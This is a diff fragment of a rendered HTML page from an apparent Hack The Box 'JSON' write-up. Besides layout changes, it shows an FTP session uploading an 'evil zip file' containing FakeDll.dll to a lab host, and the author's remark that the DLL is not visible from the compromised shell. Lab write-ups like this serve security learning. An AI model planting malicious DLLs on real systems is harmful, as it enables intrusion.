-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json/diaghub$ ftp -p 10.10.10.158
+</span></span></code></pre></div><p>Uploading the evil zip file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json/www/json/diaghub$ ftp -p 10.10.10.158
 </span></span><span style="display:flex;"><span>Connected to 10.10.10.158.
 </span></span><span style="display:flex;"><span>220-FileZilla Server 0.9.60 beta
 </span></span><span style="display:flex;"><span>220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
@@ -1235,14 +643,58 @@ I used python but have suffer bug as it converted two character &lsquo;\6&rsquo;
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">91876</span> bytes sent in 0.01 secs <span style="color:#ff79c6">(</span>6.7744 MB/s<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>ftp&gt;
 </span></span><span style="display:flex;"><span>ftp&gt; bye
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Unfortunately while we can see the FakeDll.dll from the Ftp server, we cannot see it from &lsquo;userpool&rsquo; shell :(</p>
+</span></span></code></pre></div><p>Unfortunately while we can see the FakeDll.dll from the Ftp server, we cannot see it from &lsquo;userpool&rsquo; shell :(</p>
 
       </div>
     </article>
 
     <hr />
+
+    <div class="post-info">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
+        
+
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-windows/">htb-windows</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2489 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2020-03-04 
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
       <div class="sharing-buttons">
         
 <a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2020%2f03%2fhtb-json%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
@@ -1335,44 +787,34 @@ I used python but have suffer bug as it converted two character &lsquo;\6&rsquo;
 </a>
 
       </div>
-          <hr />
 
     
-      <div class="pagination">
-        <div class="pagination__title">
-          <span class="pagination__title-h"></span>
-        </div>
+<div class="pagination">
+  
+  <hr />
+  <div class="pagination__buttons">
+    
+    <a href="https://0xade1.github.io/devdraft/posts/2020/04/htb-popcorm/" class="button next">
+      <span class="button__icon">←</span>
+      <span class="button__text">HTB - Popcorm</span>
+    </a>
+     
+    <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-re/" class="button previous">
+      <span class="button__text">HTB - Re</span>
+      <span class="button__icon">→</span>
+    </a>
+    
+  </div>
+  <hr />
+</div>
 
-        <div class="pagination__buttons">
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/02/htb-re/" class="button previous">
-                <span class="button__icon">←</span>
-                <span class="button__text">HTB - Re</span>
-            </a>
-          
 
-          
-            <a href="https://0xade1.github.io/devdraft/posts/2020/04/htb-popcorm/" class="button next">
-                <span class="button__text">HTB - Popcorm</span>
-                <span class="button__icon">→</span>
-            </a>
-          
-        </div>
-      </div>
+
     
 
-      <hr />
+    
 
-        
-
-
-
-
-
-
-
-
-
+    
 
   </main>
 
@@ -1380,41 +822,45 @@ I used python but have suffer bug as it converted two character &lsquo;\6&rsquo;
 
             
                 <footer class="footer">
+    
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2023</span>
-            
+            <span><a href="https://0xade1.github.io/devdraft"></a></span>
+            <span></span>
             <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
         </div>
     </div>
+    
+    
     <div class="footer__inner">
         <div class="footer__content">
-            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084;</span>
-          </div>
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084;</span>
+        </div>
     </div>
+    
 </footer>
 
             
         </div>
 
-        
+    
 
 
 
-<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>
+<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js" integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script>
 
 
 
 
-
- <div id="fastSearch">
-   <ul id="searchResults">
-   </ul>
-   <input id="searchInput" tabindex="0">
- </div>
- <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script> 
- <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
-
-    </body>
+    
+    <div id="fastSearch">
+      <ul id="searchResults"></ul>
+      <input id="searchInput" tabindex="0" />
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js"></script>
+    
+    <script src="https://0xade1.github.io/devdraft/js/fastsearch.js"></script>
+  </body>
 </html>
